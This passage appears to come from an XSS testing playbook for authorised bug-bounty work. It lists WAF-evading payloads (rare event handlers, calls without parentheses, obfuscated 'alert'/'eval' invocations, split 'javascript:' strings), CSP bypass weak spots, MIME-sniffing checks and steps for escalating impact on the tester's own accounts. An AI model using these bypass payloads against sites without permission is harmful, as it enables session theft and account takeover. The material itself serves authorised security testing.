Tags: `waf` `cloudflare` `akamai` `cloudfront` · Subagent: XS-F

Rare or new events that blocklists miss:
- `onpointerrawupdate`
- `onauxclick`
- `onbeforetoggle` with `popover`
- `oncontentvisibilityautostatechange`
- `onscrollend`

Ways to call a function without parentheses:
- `` alert`1` ``
- `onerror=alert;throw 1`
- `throw/**/Uncaught=window.onerror=eval,";alert\501\51"`

Ways to hide the function name:
- `top[8680439..toString(30)](1)`
- `window['al'+'ert']`
- `/aler/.source+/t/.source`
- `atob`, `import()` with your own module URL

Other techniques: string concatenation in `location=` (`javas`+`cript:`), and `&NewLine;` / `%0D%0A` splits.

Replace any third-party host or numeric IP from public payloads with your own. Never include strangers' collector URLs.

```bash
python3 -I $S/xss_payloads.py --context html --families waf,noparen,nospace,noquote
```
- **Refs:** `PS-CS` · brutelogic (KNOXSS) · Gareth Heyes (parentheses-less XSS) · community WAF bypass list (Cloudflare/Akamai/CloudFront/ModSecurity)

### XS-46 · CSP and defensive header analysis and bypass — `—` · R
Tags: `csp` `trusted-types` · Subagent: XS-F

Weak spots to check:
- `unsafe-inline` with no nonce
- `unsafe-eval` (CSTI gadgets)
- `data:` or wildcard hosts
- CDN or JSONP gadget hosts (`cdnjs`, `ajax.googleapis.com`, `*.s3.amazonaws.com`)
- `'self'` combined with same-origin JSONP or uploads
- missing `base-uri`, `object-src`, `form-action`
- nonce reuse or reflection
- report-only mode
- CSP injection through a reflected `report-uri`/policy parameter (PortSwigger lab)

Also check HttpOnly, `X-Content-Type-Options` and Trusted Types.

```bash
python3 -I $S/csp_analyze.py --har artifacts/flows/all.har
```
- **Refs:** `PS-CSP` (labs: CSP bypass via policy injection, very strict CSP + dangling markup, AngularJS + CSP) · Google CSP Evaluator · `WSTG-CLIENT`

### XS-52 · Content-type confusion and MIME sniffing — `MEDIUM–HIGH` · E
Tags: `content-type` `sniffing` · Subagent: XS-F

Responses that reflect input or serve uploads as `text/html`, or with a missing or invalid type and no `nosniff`. Check:
- user uploads (`.html`, `.htm`, `.svg`, `.xml`, `.xhtml`) on the main origin
- appending `.html` or `;.html` to API paths
- `Accept` and format parameter switching (`?format=html`, `_format=html`)
- status pages and debug endpoints
- **Refs:** community tips · `OWASP-CS` · `xssi_check.py` (nosniff flag)

### XS-60 · Impact escalation and chaining (own accounts) — `—` · I
Tags: `impact` `ato` · Subagent: XS-F

Gather what the report needs without harming users:
- Is the session cookie HttpOnly? Show `document.cookie` names only, in your own session.
- Are tokens in `localStorage`? `alert(localStorage.getItem('access_token') ? 'token present' : 'none')`.
- Can the payload read a CSRF token and perform an account-changing action (email change, add an admin) against your second test account?
- Which roles view the page (admin = higher severity)?
- Do sandbox domains or CSP limit it?

Record a screen capture from account B triggering account A's payload.
- **Refs:** `PS-XSS` (labs: exploiting XSS to steal cookies, capture passwords, bypass CSRF, using your own Collaborator) · Bugcrowd "Ultimate guide to finding and escalating XSS"

---

## Tracker

| ID | Status | Class done | Severity | Evidence |
|---|---|---|---|---|
| XS-01 … XS-60 | | | | |
